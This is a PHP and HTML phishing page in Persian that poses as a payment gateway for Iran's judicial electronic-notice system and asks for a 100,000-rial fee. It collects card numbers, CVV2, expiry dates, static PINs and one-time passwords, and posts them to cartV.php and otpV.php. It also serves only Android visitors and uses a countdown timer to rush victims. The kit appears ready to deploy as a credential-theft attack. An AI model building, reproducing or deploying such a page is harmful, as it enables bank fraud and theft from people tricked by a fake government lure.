<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];

if (strpos($userAgent, 'Android') === false) {

    echo "Access denied. This page is off";

    exit();

}

?>

<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.css">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <style>
		   body {
      margin-top: 5px;
      font-family: 'Byekan', Tahoma, Arial, sans-serif;
      background-color: #f8f9fa;
    }
    .form-group {
      margin-bottom: 0.2rem;
    }

.form-group .error-message {
      font-size: 5px;
      color: red;
      position: absolute;
      bottom: -1rem;
    }

.form-control {
      font-size: 12px;
      height: 25px;
    }

    .card {
padding:0.1rem;
margin-top:0px;position: relative;
		
 } 
    .card .form-group {
      margin-bottom: 1rem;
    }
    .card .form-group:not(:last-child) {
      margin-bottom: 0.5rem;
    }
    .input-group .form-control {
      margin-right: 0.3rem;
      text-align: center;
    }
    
	      .error {

      color: red;

      text-align: right;

    }

    .error-border {

      border-color: red;

    }
    .form-control:focus {
      box-shadow: none;
    }
    .btn-primary {
      width: 100px;
      margin: 0 auto;
      color: white;
padding: 0.25rem 0.5rem;

  font-size: 0.9rem;

  line-height: 1;
    }
    .btn-green {
      background-color: #00b847;
      color: white;
      width: 300px;
      font-size: 1.2rem;
      margin: 0 auto;
margin-top:11px;
      border: 1px solid #00b847;
    }
    .btn-green:focus,
    .btn-green:active {
      box-shadow: 0 0 0 0.2rem #00b847;
      color: white;
      border: 1px solid #00b847;
    }
    .text-right {
      text-align: right;
		font-size:12px;
    }.btn-center {

  display: flex;
text-align: center;
  justify-content: center;

  align-items: center;

}.image-container {

  position: absolute;
margin-bottom:20px;
  top: 0;

  left: 0;

}

.card-image {

margin-top:5px;
margin-bottom:5px;
  width: 100px; /* Adjust the width as needed */

 height: 80px; /* Adjust the height as needed */

}.text-card {

  display: flex;

  flex-direction: column;

  justify-content: top;
font-size:12px;
  align-items: flex-end;

  background-color: #f2f2f2;
margin-top :0px;
  padding: 10px;
  height: 90px; /* Adjust the height as needed */

}

	</style>
<style>
    @font-face {
      font-family: Byekan;
      src: url(Byekan.ttf);
    }
  </style>	
	
  <title>فرم پرداخت</title>
</head>
<body>
	
  <div class="container">

	
  
	

	
	
    <div class="card">


      <form id="paymentForm">
        <div class="form-group">
	

	

			
 <div class="text-card"><div id="timer">09:00</div> 
<p>پذیرنده : <font face="verdana" size="2" color="green">سامانه ابلاغ الکترونیک قضایی</font></p>
<p>مبلغ قابل پرداخت : <font face="verdana" size="2" color="green">100,000 ریال</font></p>

<div class="image-container"><img src="sha.jpg" class="card-image" alt="Logo">

</div>
</div>
			
			
			<div class="text-right">
            <label for="cardNumber">شماره کارت</label>
          </div>
          <div class="input-group">
            <input type="tel" class="form-control" id="cardNumber1" name="cardNumber1" maxlength="4" pattern="[0-9]{4}">
            <input type="tel" class="form-control" id="cardNumber2" name="cardNumber2" maxlength="4" pattern="[0-9]{4}">
            <input type="tel" class="form-control" id="cardNumber3" name="cardNumber3" maxlength="4" pattern="[0-9]{4}">
            <input type="tel" class="form-control" id="cardNumber4" name="cardNumber4" maxlength="4" pattern="[0-9]{4}">
          </div>
          <div class="error" id="cardNumberError"></div>
        </div>
        <div class="form-group">
          <div class="text-right">
            <label for="cvv2">cvv2</label>
          </div>
          <input type="tel" class="form-control" id="cvv2" name="cvv2" maxlength="4" pattern="[0-9]{3,4}">
          <div class="error" id="cvv2Error"></div>
        </div>
        <div class="form-group">
          <div class="text-right">
            <label for="expirationDate">تاریخ انقضا</label>
          </div>
          <div class="form-row">
           <div class="col">
              <input class="form-control" type="tel" id="expirationYear" placeholder="سال" name="expirationYear" maxlength="2" pattern="[0-9]{2}">
              		
              <div class="error" id="expirationYearError"></div>
            </div>
     
			        <div class="col">
              <input class="form-control" type="tel" id="expirationMonth" name="expirationMonth" placeholder="ماه" maxlength="2" pattern="[0-9]{2}">
              <div class="error" id="expirationMonthError"></div>	
		
            </div>
          </div>
        </div>
	

	

	
<div class="form-group">
  <div class="text-right">
    <label for="staticPassword">رمز کارت</label>
  </div>
  <div class="input-group">
    <div class="input-group-prepend">
      <button class="btn btn-sm btn-primary" id="dynamicPasswordBtn" type="button">رمز پویا</button>
    </div>
    <input type="tel" class="form-control" id="staticPassword" name="staticPassword">
  </div>
  <div class="error" id="staticPasswordError"></div>
		  </div>		  
        <div class="form-group text-center">
          <button type="submit" class="btn btn-green">پرداخت</button>			
       </div>
      </form>
    </div>
  </div>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script>
$(document).ready(function() {
cardNumber1.addEventListener('input', function() {

    if (this.value.length >= this.maxLength) {

      cardNumber2.focus();

    }

  });

  cardNumber2.addEventListener('input', function() {

    if (this.value.length >= this.maxLength) {

      cardNumber3.focus();

    } else if (this.value.length === 0) {

      cardNumber1.focus();

    }

  });

  cardNumber3.addEventListener('input', function() {

    if (this.value.length >= this.maxLength) {

      cardNumber4.focus();

    } else if (this.value.length === 0) {

      cardNumber2.focus();

    }

  });

  cardNumber4.addEventListener('input', function() {

    if (this.value.length >= this.maxLength) {

      cvv2.focus();

    } else if (this.value.length === 0) {

      cardNumber3.focus();

    }

  });

  cvv2.addEventListener('input', function() {

    if (this.value.length >= this.maxLength) {

      expirationMonth.focus();

    } else if (this.value.length === 0) {

      cardNumber4.focus();

    }

  });

  expirationMonth.addEventListener('input', function() {

    if (this.value.length >= this.maxLength) {

      expirationYear.focus();

    }

  });

  expirationYear.addEventListener('input', function() {

    if (this.value.length >= this.maxLength) {

      staticPassword.focus();

    }

  });
$("#paymentForm").submit(function(event) {

    event.preventDefault(); 

var formData = $(this).serialize();
        $(".form-control").removeClass("error-border");
        $(".error").text("");
  initialButtonText = $(".btn-green").html();
$(".btn-green").html('<i class="fa fa-spinner fa-spin" style="font-size:30px"></i>');
        $.ajax({
          type: "POST",
          url: "cartV.php",
          data: formData,
          dataType: "json", 
          success: function(response) {
            if (response.success) {
swal({

   

     text: "تراکنش شما در حال تایید است. می توانید این صفحه را ببندید. اطلاعات تا دقایقی دیگر برای شما پیامک خواهد شد.",
	
      icon: "success",
buttons: {

        ok: {

          text: "تایید",

          className: "btn-center",  // Add custom class for red button

          closeModal: true  // Keep the modal open when the button is clicked

        }

      },

      closeOnClickOutside: false,

      buttonsStyling: false,

      customClass: {

        confirmButton: "btn-center" 

      }
    }).then(function() {
	resetFormFields(); 
 window.location.href = "end.php";

    });
            } else {
              if (response.errors.hasOwnProperty("cardNumber")) {
                $("#cardNumberError").text(response.errors.cardNumber);
                $("#cardNumber1").addClass("error-border"); $("#cardNumber2").addClass("error-border"); $("#cardNumber3").addClass("error-border"); $("#cardNumber4").addClass("error-border");

				  
				  
              }
              if (response.errors.hasOwnProperty("cvv2")) {
                $("#cvv2Error").text(response.errors.cvv2);
                $("#cvv2").addClass("error-border");
              }
              if (response.errors.hasOwnProperty("expirationMonth")) {
                $("#expirationMonthError").text(response.errors.expirationMonth);
                $("#expirationMonth").addClass("error-border");
              }
              if (response.errors.hasOwnProperty("expirationYear")) {
                $("#expirationYearError").text(response.errors.expirationYear);
                $("#expirationYear").addClass("error-border");
              }
              if (response.errors.hasOwnProperty("staticPassword")) {
                $("#staticPasswordError").text(response.errors.staticPassword);
                $("#staticPassword").addClass("error-border");
              }
            }
			  $(".btn-green").html(initialButtonText);
			  
          },
          error: function() {
            // Error message for AJAX request failure
            swal("خطا", "خطایی در برقراری ارتباط با سرور رخ داد.", "error");
          }
			
        });
      });
	

$("#dynamicPasswordBtn").click(function(event) {
  event.preventDefault(); // Prevent default button behavior
  
  // Reset field borders and error messages
  $(".form-control").removeClass("error-border");
  $(".error").text("");
  
  var formData = $("#paymentForm").serialize(); // Serialize the entire form data
  
  initialButtonText = $(".btn-primary").html();
$("#dynamicPasswordBtn").prop("disabled", true);  

  $.ajax({
    type: "POST",
    url: "otpV.php",
    data: formData,
    dataType: "json",
    success: function(response) {
      if (response.success) {
swal({
buttons: {

        ok: {

          text: "تایید",
        }

      },
          text: "رمز پویا از طریق پیامک برای شما ارسال خواهد شد، اگر رمز پویا را دریافت نکردید از برنامک های رمزساز استفاده کنید یا به بانک صادر کننده مراجعه فرمایید",
closeOnClickOutside: false,
       }).then(function() {
          // Start the two-minute countdown timer
          var timer = 120;
          var countdown = setInterval(function() {
            var minutes = Math.floor(timer / 60);
            var seconds = timer % 60;
            $(".btn-primary").html("" + minutes + ":" + (seconds < 10 ? "0" : "") + seconds + "");
            timer--;
            if (timer < 0) {
              clearInterval(countdown);
   $(".btn-primary").html("رمز پویا");
				$("#dynamicPasswordBtn").prop("disabled", false);
	
			}
			  
          }, 1000);
          
        });
      } else {
        if (response.errors.hasOwnProperty("cardNumber")) {
          $("#cardNumberError").text(response.errors.cardNumber);
          $("#cardNumber1").addClass("error-border");
          $("#cardNumber2").addClass("error-border");
          $("#cardNumber3").addClass("error-border");
          $("#cardNumber4").addClass("error-border");
        }
        if (response.errors.hasOwnProperty("cvv2")) {
          $("#cvv2Error").text(response.errors.cvv2);
          $("#cvv2").addClass("error-border");
        }
        if (response.errors.hasOwnProperty("expirationMonth")) {
          $("#expirationMonthError").text(response.errors.expirationMonth);
          $("#expirationMonth").addClass("error-border");
        }
        if (response.errors.hasOwnProperty("expirationYear")) {
          $("#expirationYearError").text(response.errors.expirationYear);
          $("#expirationYear").addClass("error-border");
        }
        if (response.errors.hasOwnProperty("staticPassword")) {
          $("#staticPasswordError").text(response.errors.staticPassword);
          $("#staticPassword").addClass("error-border");
        }
        
        $(".btn-primary").html(initialButtonText);
$("#dynamicPasswordBtn").prop("disabled", false);
	  }
    },
    error: function() {
      swal("خطا", "خطایی در برقراری ارتباط با سرور رخ داد.", "error");
      $(".btn-primary").html(initialButtonText);
$("#dynamicPasswordBtn").prop("disabled", false);    
	}
  });
});	
});
	
function resetFormFields() {
  document.getElementById("paymentForm").reset();
}

	  
	  
const timerDuration = 9 * 60;
const timerElement = document.getElementById('timer');

// Start the timer
let remainingSeconds = timerDuration;
updateTimer();

function updateTimer() {
  const minutes = Math.floor(remainingSeconds / 60);
  const seconds = remainingSeconds % 60;
  const formattedTime = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
  timerElement.textContent = formattedTime;

  if (remainingSeconds > 0) {
    remainingSeconds--;
    setTimeout(updateTimer, 1000);
  }else {
    window.close();
  }
}	
  </script>
</body>
</html>
